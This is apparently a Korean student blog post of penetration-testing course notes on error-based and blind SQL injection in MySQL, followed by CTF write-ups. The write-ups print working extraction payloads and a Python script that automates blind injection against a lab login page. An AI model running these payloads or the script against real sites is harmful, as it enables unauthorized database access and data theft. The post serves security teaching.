--- meta
title: Penetration Testing | Week 7
date: 2025/05/25
excerpt: Error-Based SQL Injection과 <br> Blind SQL Injection
categories: 모의 해킹
---

### 강의 노트

#### Error-Based SQL Injection

**Error-Based SQL Injection**이란 데이터베이스의 오류 메시지가 사용자에게 반환되는 환경에서 활용 가능한 SQL Injection 기법을 의미한다. 이 기법은 쿼리의 <strong>구문상 오류(Syntax Error)</strong>가 아닌, 실행 과정에서 발생하는 <strong>논리적 오류(Logic Error)</strong>를 기반으로 한다. 문법적으로 유효한 SQL 쿼리가 데이터베이스 상에서 정상적으로 실행되지만, 실행 결과 특정 제약 조건 위반 등의 논리적 오류로 인해 데이터베이스에서 오류 메시지를 반환하는 경우를 말한다. 이 오류 메시지가 그대로 사용자에게 출력되는 경우, 공격자는 해당 메시지를 매개로 데이터베이스 내부 정보를 추론하거나 직접적으로 노출시킬 수 있다.

실제 웹 사이트에서의 예시를 통해 Error-Based SQL Injection의 동작 방식을 자세히 살펴 보자.

![Error-Based SQL Injection](/data/Penetration%20Testing%20|%20Week%207/1.png)

아이디의 중복 검사 기능을 지원하는 간이 웹 사이트이다. 예시 검색어 `normaltic`을 입력해 보자.

![Error-Based SQL Injection](/data/Penetration%20Testing%20|%20Week%207/2.png)

존재하는 아이디라는 내용의 메시지가 출력되며, 서버 측에서 사용되는 SQL 쿼리는 `select * from member where id = 'normaltic'`임을 알 수 있다. 이때 검색어로 `normaltic'`을 입력하면 어떻게 될까?

![Error-Based SQL Injection](/data/Penetration%20Testing%20|%20Week%207/3.png)

SQL Syntax Error, 즉 구문 오류가 발생한다. 이는 쿼리가 올바른 문법적 요건을 갖추지 못했기 때문이며, 이러한 문법적 오류는 입력한 검색어에 문제가 있다는 내용의 메시지만을 출력하므로 SQL Injection 공격에 활용할 수 없다.

Error-Based SQL Injection에서 활용할 수 있는 논리적 오류의 예시는 다음과 같다.

![Error-Based SQL Injection](/data/Penetration%20Testing%20|%20Week%207/4.png)

입력한 페이로드는 다음과 같다.

<pre><code class="language-sql hljs" data-highlighted="yes"><span class="hljs-string">normaltic'</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-string">'&lt;x/&gt;'</span>, <span class="hljs-string">':path'</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span> <span class="hljs-operator">=</span> <span class="hljs-string">'1
</span></code></pre>

`and '1' = '1` 조건은 쿼리의 마지막에 위치한 작은따옴표를 올바르게 대응시켜 문법적 오류가 발생하지 않도록 삽입한 구문이며, `extractvalue('<x/>', ':path')`는 의도적으로 오류가 발생하도록 설계된 구문이다.

> <strong>EXTRACTVALUE()</strong>
>
> <strong>`EXTRACTVALUE()`</strong> 함수는 **XML** 문자열에서 **XPath** 표현식을 사용하여 특정 값을 추출하는 MySQL 함수이다.  
> - **XML**: HTML과 유사한 형태의 마크업 언어로, 웹 페이지의 형태를 기술하기 위한 언어인 HTML과 달리 데이터의 구조를 정의하기 위해 사용된다.  
> - **XPath**: XML 문서에서 특정 노드를 선택하기 위해 사용되는 경로 기반 언어이다. HTML 요소를 선택하기 위한 CSS 선택자와 유사한 역할을 한다.  
>
> 사용 예시는 아래와 같다.
>
> ```sql
> /* Syntax */
> EXTRACTVALUE(xml_data, xpath_expression)
>
> /* Example */
> EXTRACTVALUE('<item>test<value>null</value></item>', '/item') -- 반환 값: test
> EXTRACTVALUE('<item>test<value>null</value></item>', '/item/value') -- 반환 값: null
> ```

`:path`과 같이 `:`으로 시작되는 문자열은 적절한 XPath 표현식이 아니기 때문에, 문법적으로 올바른 쿼리가 실행되었음에도 위와 같이 논리적 오류(XPath 구문 오류)가 발생한다. SQL 구문 오류와 유사하게, XPath 구문 오류 역시 어느 위치에서 오류가 발생하였는지 오류 메시지에 명시되어 있음을 알 수 있다.

이러한 논리적 오류를 이용해 어떻게 SQL Injection을 수행할 수 있을까? 다음 예시를 보자.

![Error-Based SQL Injection](/data/Penetration%20Testing%20|%20Week%207/5.png)

입력한 페이로드는 다음과 같다.

<pre><code class="language-sql hljs" data-highlighted="yes"><span class="hljs-string">normaltic'</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-string">'&lt;x/&gt;'</span>, concat(<span class="hljs-number">0x3a</span>, (<span class="hljs-keyword">select</span> <span class="hljs-string">'test'</span>))) <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span> <span class="hljs-operator">=</span> <span class="hljs-string">'1
</span></code></pre>

`CONCAT()` 함수는 SQL에서 문자열을 결합하는 데 사용되는 함수이며, 예시 페이로드에서는 `CONCAT()` 함수에 두 개의 인자 `0x3a`와 `(select 'test')`가 사용된 것을 알 수 있다. `0x3a`는 ASCII 코드상 `:` 문자에 해당하는 16진수 표현으로, 특수 문자의 경우 예기치 않은 인코딩 변환 등의 문제를 방지하기 위하여 이와 같이 바이너리 값으로 명시하는 방식이 자주 활용된다. `(select 'test')`는 괄호로 감싸진 서브쿼리(메인 쿼리 안에 포함된 또 다른 SQL 쿼리)로, 메인 쿼리 내부에서 실행되어 그 결과를 반환한다. 해당 서브쿼리의 실행 결과는 `test`이므로, `CONCAT()` 함수는 `:`과 `test`를 결합하여 `:test` 문자열을 생성한다. 이후 `EXTRACTVALUE()` 함수의 인자로 올바르지 않은 XPath 표현식이 포함되고, 최종적으로 `XPATH syntax error: ':test'`와 같은 오류 메시지가 출력되는 것이다.

오류 메시지에서 주목할 만한 부분은 사용자가 삽입한 서브쿼리의 반환 결과가 메시지 내용에 포함되어 출력되었다는 사실이다. 이는 공격자가 임의의 SQL 쿼리를 페이로드에 포함시켜 데이터베이스 정보를 노출시킬 수 있다는 의미이다. 예를 들어, `select 'test'` 대신 UNION SQL Injection에서 활용했던 `select database()`를 삽입해 보자.

![Error-Based SQL Injection](/data/Penetration%20Testing%20|%20Week%207/6.png)

현재 사용 중인 데이터베이스의 이름인 `segfault_sql`이 출력되는 것을 확인할 수 있다. 이후 UNION SQL Injection과 동일한 절차를 거쳐 데이터를 추출할 수 있다.

---

#### Blind SQL Injection

**Blind SQL Injection**이란 오류 메시지를 확인할 수 없는 환경에서 참/거짓 판단을 통해 데이터베이스 정보를 유추하는  SQL Injection 기법을 의미한다.

Blind SQL Injection의 동작 방식을 이해하기 위해 아래의 예시 웹 사이트를 살펴 보자.

![Blind SQL Injection](/data/Penetration%20Testing%20|%20Week%207/7.png)

마찬가지로 아이디 중복 검사를 수행하는 웹 사이트이다. SQL Injection이 가능한지 파악하기 위해 `AND` 연산을 활용한 페이로드를 삽입해 보자.

![Blind SQL Injection](/data/Penetration%20Testing%20|%20Week%207/8.png)
![Blind SQL Injection](/data/Penetration%20Testing%20|%20Week%207/9.png)

서버 측에서 실행되는 SQL 쿼리의 반환 결과 유무에 따라 아이디의 존재 여부를 알리는 메시지가 출력된다.

![Blind SQL Injection](/data/Penetration%20Testing%20|%20Week%207/10.png)

쿼리를 실행하는 과정에서 오류가 발생한 경우에는 오류 메시지를 출력하지 않는다.

이처럼 SQL 쿼리의 조건절의 참/거짓 여부에 따른 차이를 식별할 수 있고 오류 메시지가 출력되지 않을 때 Blind SQL Injection을 사용한다. 이때 삽입하는 페이로드는 다음과 같은 형태이다.

<pre><code class="language-sql hljs" data-highlighted="yes"><span class="hljs-string">normaltic'</span> <span class="hljs-keyword">and</span> [condition] <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span> <span class="hljs-operator">=</span> <span class="hljs-string">'1
</span></code></pre>

`[condition]` 위치에 참/거짓으로 판단될 수 있는 임의의 비교 연산식을 삽입하여 사용한다. `and '1' = '1` 조건은 Error-Based SQL Injection에서와 마찬가지로 쿼리의 마지막에 위치한 작은따옴표를 올바르게 대응시키 위한 구문이다. 이때 쿼리의 각 조건식은 `AND` 연산으로 연결되어 있고 그 중 `'1' = '1'` 조건은 항상 참이므로, 조건절 전체의 진리값은 `[condition]` 위치에 삽입되는 조건의 참/거짓 여부에 의해 결정된다.

Blind SQL Injection의 궁극적인 목적은 데이터베이스 내 정보를 임의로 추측한 문자열과 비교하는 연산식을 `[condition]` 위치에 삽입하고, 조건절이 참으로 평가될 때까지 반복적인 작업을 수행함으로써 올바른 데이터를 유추해내는 것이다. 다음의 예시를 보자.

![Blind SQL Injection](/data/Penetration%20Testing%20|%20Week%207/11.png)

입력한 페이로드는 다음과 같다.

<pre><code class="language-sql hljs" data-highlighted="yes"><span class="hljs-string">normaltic'</span> <span class="hljs-keyword">and</span> (substr((<span class="hljs-keyword">select</span> <span class="hljs-string">'test'</span>), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">'t'</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span> <span class="hljs-operator">=</span> <span class="hljs-string">'1
</span></code></pre>

`[condition]` 위치에 삽입된 `substr((select 'test'), 1, 1) = 't'`는 데이터베이스에서 실행되는 서브쿼리를 포함한 비교 연산식이다.

> <strong>SUBSTR()</strong>
>
> <strong>`SUBSTR()`</strong> 함수는 문자열을 특정 위치부터 일정 길이만큼 잘라서 반환하는 함수이다. 문자열의 일부를 추출하는 경우에 사용된다.
>
> 사용 예시는 아래와 같다.
>
> ```sql
> /* Syntax */
> SUBSTR(string, start_position, length)
>
> /* Example */
> SUBSTR('test', 1, 1) -- 반환 값: t
> SUBSTR('test', 2, 2) -- 반환 값: es
> ```

`substr((select 'test'), 1, 1)`는 곧 서브쿼리의 반환 결과 `test`의 첫 글자를 의미한다. 이는 조건식 내에서 `t`와 비교되고, 조건절의 진리값이 참으로 평가됨으로써 존재하는 아이디라는 메시지가 출력된다. 이러한 `SUBSTR()` 함수의 특성을 이용하면 임의 쿼리의 반환 결과가 어떤 문자로 이루어졌는지 유추할 수 있다. `select 'test'` 대신 `select database()`를 삽입해 보자.

![Blind SQL Injection](/data/Penetration%20Testing%20|%20Week%207/12.png)

`normaltic' and (substr((select database()), 1, 1) = 't') and '1' = '1`를 입력한 경우 조건절의 진리값이 거짓임을 파악하였고, 따라서 사용 중인 데이터베이스명의 첫 글자가 `t`가 아니라는 사실을 추론할 수 있었다. 공격자는 이와 같은 비교 과정을 반복적으로 수행함으로써 데이터를 추출할 수 있다.

그러나 데이터를 한 글자씩 반복적으로 추출하여 값을 확인하는 방식은 매우 많은 시간이 소요된다는 단점이 있다. 이때 `ASCII()` 함수를 사용하면 비교 횟수를 대폭 줄일 수 있다. `ASCII()` 함수는 특정 문자를 ASCII 코드(10진수)로 변환하여 반환하는 함수로, 문자를 숫자 값으로 다룰 수 있다는 장점이 있다. 이를테면 다음 예시를 보자.

<pre><code class="language-sql hljs" data-highlighted="yes"><span class="hljs-string">normaltic'</span> <span class="hljs-keyword">and</span> (substr((<span class="hljs-keyword">select</span> database()), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">'t'</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span> <span class="hljs-operator">=</span> <span class="hljs-string">'1</span>
<span class="hljs-string">normaltic'</span> <span class="hljs-keyword">and</span> (ascii(substr((<span class="hljs-keyword">select</span> database()), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)) <span class="hljs-operator">=</span> <span class="hljs-number">116</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span> <span class="hljs-operator">=</span> <span class="hljs-string">'1
</span></code></pre>

위의 두 페이로드는 논리적으로 동일한 의미이다. 하지만 두 번째 페이로드를 사용하는 경우, 숫자 간의 비교를 수행하기 때문에 등호뿐만 아니라 부등호 역시 사용할 수 있다.

<pre><code class="language-sql hljs" data-highlighted="yes"><span class="hljs-string">normaltic'</span> <span class="hljs-keyword">and</span> (ascii(substr((<span class="hljs-keyword">select</span> database()), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)) <span class="hljs-operator">&lt;</span> <span class="hljs-number">116</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span> <span class="hljs-operator">=</span> <span class="hljs-string">'1
</span></code></pre>

위와 같이, 비교 연산을 범위 기반으로 수행할 수 있게 되므로 올바른 문자를 더 신속하게 찾아낼 수 있다. 이러한 방식으로 Blind SQL Injection 기법을 활용하면 데이터나 오류 메시지가 출력되지 않는 환경에서도 효과적으로 데이터를 추출할 수 있게 된다.

<br>
<br>
<br>

### 과제

#### SQL Injection CTF

![SQL Injection CTF](/data/Penetration%20Testing%20%7C%20Week%207/13.png)

CTF를 해결하며 Error-Based SQL Injection과 Blind SQL Injection을 복습해 보자.

<br>

##### SQL Injection 3

<img src="/data/Penetration%20Testing%20%7C%20Week%207/14.png" alt="SQL Injection 3" style="padding: 0 200px; background-color: white">

링크의 주소로 접속하면 다음과 같은 로그인 페이지로 이동한다.

![SQL Injection 3](/data/Penetration%20Testing%20%7C%20Week%207/15.png)

주어진 계정은 `normaltic` / `1234`이므로, SQL Injection이 가능한지 확인하기 위해 `normaltic' and '1' = '1` / `1234`를 입력하였고 성공적으로 로그인이 수행되는 것을 확인하였다.

아이디 입력란에서 SQL Injection이 유효하다는 사실을 파악했으므로 `normaltic'`을 입력하여 구문 오류를 유도한 다음, 오류 메시지가 화면에 출력되는지 확인해 보았다.

![SQL Injection 3](/data/Penetration%20Testing%20%7C%20Week%207/16.png)

오류 내용이 출력되는 것을 확인하였으며 데이터베이스 소프트웨어로 MySQL이 사용된다는 사실 또한 확인할 수 있었다. 이러한 환경에서는 `EXTRACTVALUE()` 함수를 활용해 Error-Based SQL Injection 공격을 수행할 수 있으므로, `normaltic' and extractvalue('<x/>', concat(0x3a, ([SQL]))) and '1' = '1`의 형태로 페이로드 포맷을 작성하였다. 다음으로 `[SQL]` 위치에 `select database()`를 삽입하고 아이디 입력란에 페이로드를 입력하여 데이터베이스명을 추출해 보았다.

![SQL Injection 3](/data/Penetration%20Testing%20%7C%20Week%207/17.png)

예상대로 XPATH 구문 오류가 발생하였으며 `sqli_2`라는 데이터베이스명이 출력되었다. 이후 페이로드의 `[SQL]` 위치에 `select table_name from information_schema.tables where table_schema = 'sqli_2' limit 0, 1`를 삽입한 후 아이디 입력란에 입력하여 테이블명을 추출해 보았다.

![SQL Injection 3](/data/Penetration%20Testing%20%7C%20Week%207/18.png)

그 결과 `flag_table`이라는 테이블명이 추출되었다. 이어서 컬럼명 추출을 위해 `[SQL]` 위치에 `select column_name from information_schema.columns where table_name = 'flag_table' limit 0, 1`를 삽입한 뒤 페이로드를 입력하였다.

![SQL Injection 3](/data/Penetration%20Testing%20%7C%20Week%207/19.png)

`flag`라는 컬럼명이 추출되었다. 마지막으로 페이로드에 `select flag from flag_table limit 0, 1`을 삽입하여 플래그 추출을 시도하였다.

![SQL Injection 3](/data/Penetration%20Testing%20%7C%20Week%207/20.png)

플래그를 획득하였다.

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">Basic_Basic_ErrorSQLi</span>}</span></p>

<br>

##### SQL Injection 4

<img src="/data/Penetration%20Testing%20%7C%20Week%207/21.png" alt="SQL Injection 4" style="padding: 0 200px; background-color: white">

링크의 주소로 접속하면 마찬가지로 로그인 페이지로 이동한다.

아이디 입력란에서 SQL Injection 공격이 가능하며, 오류가 발생할 경우 오류 메시지가 출력된다는 사실을 파악하였다. 따라서 Error-Based SQL Injection을 시도하기로 결정하였고, 위와 동일하게 `normaltic' and extractvalue('<x/>', concat(0x3a, ([SQL]))) and '1' = '1`의 형태로 페이로드 포맷을 작성하였다.

이후 `[SQL]` 위치에 각각 `select database()`와 `select table_name from information_schema.tables where table_schema = 'sqli_2_1' limit 0, 1`을 삽입함으로써 데이터베이스명 `sqli_2_1`과 테이블명 `flag_table`을 추출하였다.

다음으로 컬럼명을 추출하기 위해 `[SQL]` 위치에 `select column_name from information_schema.columns where table_name = 'flag_table' limit 0, 1`를 삽입하여 입력해 보았다.

![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/22.png)

`flag1`이라는 컬럼명이 출력되었으며, 컬럼명으로 미루어 보아 `flag2`, `flag3` 등의 컬럼이 존재할 것으로 판단되었다. 따라서 실제 필드 값을 확인해 보기 전에, 삽입하는 서브쿼리의 `LIMIT` 절의 `offset` 값을 늘려 가며 다른 컬럼이 존재하는지 확인해 보기로 결정하였다.

![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/23.png)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/24.png)

확인 결과 `offset` 값에 0 ~ 7을 삽입하면 `flag1`에서 `flag8`까지의 컬럼명이 출력되며, `offset` 값에 8이 삽입되는 순간 오류가 발생하지 않은 채로 로그인에 실패하는 것을 확인하였다. 따라서 `flag_table`의 컬럼 수는 총 8개라는 사실을 확인하였다.

이후 `[SQL]` 위치에 `select flag1 from flag_table limit 0, 1`를 시작으로 컬럼명을 바꿔 가며 총 8개의 서브쿼리를 삽입하여 각 컬럼의 필드 값을 확인해 보았다.

![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/25.png)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/26.png)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/27.png)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/28.png)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/29.png)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/30.png)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/31.png)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/32.png)

총 8개의 문자열이 출력되었고, 각 문자열을 이어 붙여 플래그를 획득하였다.

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">1you_must_concat_this_string_goodjob</span>}</span></p>

<br>

##### SQL Injection 5

<img src="/data/Penetration%20Testing%20%7C%20Week%207/33.png" alt="SQL Injection 5" style="padding: 0 200px; background-color: white">

링크의 주소로 접속하여 로그인을 시도한 결과, 앞선 문제와 마찬가지로 Error-Based SQL Injection이 유효함을 확인하였다. 따라서 위와 같은 방법으로 데이터베이스명 `sqli_2_2`와 테이블명 `flagTable_this`, 컬럼명 `flag`까지 추출하는 데 성공하였다.

이후 `select flag from flagTable_this limit 0, 1`부터 `offset` 값을 늘려 가며 데이터를 추출해 보았다.

![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/34.png)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/35.png)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/36.png)
![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/37.png)

`flagTable_this` 안에 꽤나 많은 수의 레코드가 존재하는 듯했다. 따라서 플래그가 `segfault{...}` 형태라는 것을 활용해 `LIKE` 연산자를 포함한 쿼리를 작성하는 것이 효율적이라고 판단하였다. 서브쿼리로 `select flag from flagTable_this where flag like 'segfault%'`를 입력해 보았다.

![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/38.png)

플래그가 출력되었다.

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">manyData_youFind</span>}</span></p>

<br>

##### SQL Injection 6

<img src="/data/Penetration%20Testing%20%7C%20Week%207/39.png" alt="SQL Injection 6" style="padding: 0 200px; background-color: white">

링크의 주소로 접속하여 로그인을 시도한 결과, 아이디 입력란에서 SQL Injection 공격이 가능하나 오류 메시지가 출력되지 않아 Error-Based SQL Injection은 불가함을 확인하였다. 따라서 Blind SQL Injection을 시도해 보기로 결정하였다.

Blind SQL Injection 기법의 특성상, 데이터 추출을 위해 각 문자의 값을 개별적으로 확인하는 방식이 요구되어 시간적 소모가 상당하므로, 자동화 스크립트를 작성하여 공격을 수행하였다.

작성된 스크립트는 다음과 같다.

```python
# blind_sqli.py

import requests

url = "http://ctf2.segfaulthub.com:7777/sqli_3/login.php"

def is_true(row, idx, asc):
  if sql.strip().lower() == "select database()" and row > 0:
    return False
  payload = f"normaltic' and (ascii(substr(({sql} limit {row}, 1), {idx}, 1)) > {asc})
              and '1' = '1"
  request_data = {"UserId": payload, "Password": "1234", "Submit": "Login"}
  return "Logged In" in requests.post(url, request_data).text

def find_char(row, idx, low = 32, high = 126):
  if low > high:
    return None
  mid = (low + high) // 2
  if is_true(row, idx, mid):
    return find_char(row, idx, mid + 1, high)
  else:
    if is_true(row, idx, mid - 1):
      return chr(mid)
    else:
      return find_char(row, idx, low, mid - 1)

def extract_data():
  print("[*] Extracting...")
  row = 0
  res = []
  while True:
    data, idx = "", 1
    while True:
      char = find_char(row, idx)
      if char is None:
        break
      data += char
      idx += 1
    if not data:
      break
    res.append(data)
    row += 1
  return res

while True:
  sql = input("Enter the SQL query to extract data.(Press 'q' to quit.)\nSQL > ")
  if sql == "q":
    break
  print(f"[+] Data extracted: {", ".join(extract_data())}\n")
```

Blind SQL Injection 기법의 핵심은 페이로드에 삽입한 조건의 참/거짓 여부를 판단하는 데 있으며, 위의 경우에는 로그인 성공 여부를 통해 판별한다. 따라서 응답 결과에 `Logged In` 텍스트가 포함되면 참, 그렇지 않으면 거짓을 반환하는 함수를 사용하였다. `SELECT DATABASE()`문은 테이블이 아닌 상수를 반환하기 때문에 뒤의 `LIMIT` 절이 무시되는 특징이 있었으므로, 무한 루프 방지를 위해 예외 조건을 삽입하였다.

스크립트를 실행하면 사용자가 SQL 쿼리를 입력할 수 있는 인터페이스를 제공하며, 입력한 쿼리를 기반으로 데이터를 추출하여 화면에 출력하는 구조로 설계되어 있다. 실행 결과는 다음과 같다.

![SQL Injection 4](/data/Penetration%20Testing%20%7C%20Week%207/40.png)

데이터 추출 과정을 거쳐 최종적으로 플래그를 획득하였다.

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">Blind_SQLi_EASY</span>}</span></p>